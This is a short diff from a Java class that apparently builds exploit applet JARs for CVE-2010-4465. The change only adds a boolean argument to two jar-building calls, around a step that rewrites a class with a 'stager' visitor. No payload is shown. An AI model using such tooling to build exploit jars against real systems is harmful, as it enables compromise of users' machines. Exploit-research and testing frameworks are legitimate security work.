@@ -97,7 +97,7 @@ public class CVE_2010_4465_AppletJarBuilder extends Builder {
 		final InputStream is = originalClass.getResourceAsStream("/" + originalClass.getName().replace('.', '/') + ".class");
 		new ClassReader(is).accept(stagerVisitor, ClassReader.SKIP_DEBUG);
 		is.close();
-		JarBuilder.buildJar("1.jar", new Class[0], false, new Manifest(), originalClass.getName().replace('.', '/') + ".class", cw.toByteArray());
-		JarBuilder.buildJar("2.jar", new Class[] {originalClass}, false, new Manifest(), null, null);
+		JarBuilder.buildJar("1.jar", new Class[0], false, false, new Manifest(), originalClass.getName().replace('.', '/') + ".class", cw.toByteArray());
+		JarBuilder.buildJar("2.jar", new Class[] {originalClass}, false, false, new Manifest(), null, null);
 	}
 }
